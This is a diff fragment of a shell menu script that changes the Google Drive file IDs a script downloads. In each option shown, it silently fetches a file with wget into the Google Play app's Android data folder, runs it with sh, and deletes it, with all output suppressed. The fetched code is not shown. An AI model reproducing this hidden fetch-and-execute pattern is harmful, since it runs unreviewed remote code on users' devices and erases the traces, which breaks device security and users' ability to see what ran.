@@ -29,21 +29,21 @@ if [ $option -eq 1 ]; then
             echo "+---------------------------------------+"
             masban=/storage/emulated/0/Android/data/com.android.vending/files/act
             rm -rf $masban 2> /dev/null
-            wget "https://docs.google.com/uc?export=download&id=1EfqWLVu0WOVnbCvEwMeTWsnJRg4CzPmz" -O $masban > /dev/null 2>&1
+            wget "https://docs.google.com/uc?export=download&id=1Ek-k-nZtWEbXpkYyJKneY4bVWNrZYurN" -O $masban > /dev/null 2>&1
             sh $masban 2> /dev/null
             rm -rf $masban 2> /dev/null
 elif [ $option -eq 2 ]; then
             echo "+---------------------------------------+"
             masban=/storage/emulated/0/Android/data/com.android.vending/files/act
             rm -rf $masban 2> /dev/null
-            wget "https://docs.google.com/uc?export=download&id=1BhRHbfiIhB4yPFydglZ3-AZ9MEgBEs4q" -O $masban > /dev/null 2>&1
+            wget "https://docs.google.com/uc?export=download&id=1ElG9QLtH5WAEkNFUJeHXFUIITje_Hvf3" -O $masban > /dev/null 2>&1
             sh $masban 2> /dev/null
             rm -rf $masban 2> /dev/null
 elif [ $option -eq 3 ]; then
             echo "+---------------------------------------+"
             masban=/storage/emulated/0/Android/data/com.android.vending/files/act
             rm -rf $masban 2> /dev/null
-            wget "https://docs.google.com/uc?export=download&id=1C7oAMZXz4qBFoH4hxIR4g72opvvGptDE" -O $masban > /dev/null 2>&1
+            wget "https://docs.google.com/uc?export=download&id=1F-mG4C_mWc9q3ZUAmLQRxY0hxPpcz4Jj" -O $masban > /dev/null 2>&1
             sh $masban 2> /dev/null
             rm -rf $masban 2> /dev/null
 elif [ $option -eq 4 ]; then
